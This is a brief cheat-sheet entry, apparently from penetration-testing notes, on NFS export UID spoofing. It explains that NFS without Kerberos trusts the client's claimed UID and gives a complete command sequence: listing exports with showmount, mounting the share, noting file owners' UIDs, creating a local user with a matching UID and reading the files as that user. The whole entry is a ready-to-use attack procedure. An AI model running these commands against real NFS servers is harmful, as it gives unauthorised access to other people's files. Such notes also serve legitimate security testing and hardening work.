# NFS Export UID Spoofing

NFS (without Kerberos) trusts the client's claimed UID — create a local user with the matching UID to read files "owned" by someone else on the share.

```bash
showmount -e <TARGET>                                  # list exports
mount -t nfs <TARGET>:<export-path> <local-mountpoint> -o nolock

ls -ln <local-mountpoint>                               # note the owning UID of files you can't read
useradd -u <that-uid> faker                              # create a local user with the same UID
su faker
cat <local-mountpoint>/<file>                            # now readable
```
